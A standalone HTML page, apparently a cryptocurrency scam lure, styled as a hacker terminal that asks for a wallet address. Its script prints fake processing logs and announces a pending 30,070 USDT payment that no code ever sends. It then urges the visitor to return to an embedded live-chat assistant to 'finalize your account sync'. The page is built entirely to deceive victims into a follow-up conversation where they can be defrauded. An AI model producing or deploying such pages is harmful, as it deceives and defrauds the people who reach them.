<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --neon: #00ff41; }
        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; height: 100dvh; display: flex; align-items: center; justify-content: center; overflow: hidden; transition: background 2s ease; }
        
        .live-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px); background-size: 50px 50px; animation: scrollGrid 10s linear infinite; pointer-events: none; }
        @keyframes scrollGrid { 0% { transform: translateY(0); } 100% { transform: translateY(50px); } }
        
        .processing .live-bg { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }

        .terminal-card { border: 1px solid var(--neon); padding: 30px; border-radius: 4px; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px); width: 90%; max-width: 450px; box-shadow: 0 0 40px rgba(0, 255, 65, 0.15); z-index: 1; }
        .log { font-size: 0.7em; height: 80px; overflow-y: hidden; color: #008f11; margin-bottom: 20px; border-bottom: 1px solid #111; }
        input { width: 100%; padding: 12px; background: #080808; border: 1px solid var(--neon); color: var(--neon); outline: none; margin: 10px 0; }
        button { width: 100%; padding: 12px; background: var(--neon); color: #000; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; }
        .glitch { animation: flash 0.5s infinite; }
        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="live-bg"></div>
    <div class="terminal-card">
        <div id="log" class="log">> Initializing Nexus Core...<br>> Establishing secure node...</div>
        <div id="ui">
            <h3>> System ID: V-082</h3>
            <input type="text" id="address" placeholder="Enter Wallet Address">
            <button onclick="run()">Execute Verification</button>
        </div>
    </div>
    <script>
        // Tawk.to integration
        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
        (function(){
            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
            s1.async=true; s1.src='https://embed.tawk.to/64b5840994cf5d49dc64a517/1h5g9i18i';
            s1.charset='UTF-8'; s1.setAttribute('crossorigin','*');
            s0.parentNode.insertBefore(s1,s0);
        })();

        const logBox = document.getElementById('log');
        function addLog(msg) { logBox.innerHTML += `<br>> ${msg}`; logBox.scrollTop = logBox.scrollHeight; }
        
        function run() {
            const addr = document.getElementById('address').value;
            
            // Basic Validation
            if(addr.length < 20 || !addr.startsWith('0x')) {
                addLog("ERROR: Invalid Address Format.");
                alert("Please enter a valid wallet address (must start with 0x and be long enough).");
                return;
            }
            
            document.body.classList.add('processing');
            addLog("Encrypting payload...");
            addLog("Broadcasting to chain...");
            
            document.getElementById('ui').innerHTML = "<h3 class='glitch'>Processing Transaction...</h3>";
            
            setTimeout(() => {
                document.body.classList.remove('processing');
                addLog("Status: Sync Pending");
                document.getElementById('ui').innerHTML = `
                    <h3>> Transaction Pending</h3>
                    <p>Recipient: ${addr.substring(0,6)}...${addr.substring(addr.length-4)}</p>
                    <p>Amount: 30,070 USDT</p>
                    <p style='color:yellow'>Status: Awaiting network confirmation. Please report back to the chat assistant to finalize your account sync.</p>
                `;
            }, 2500);
        }
    </script>
</body>
</html>
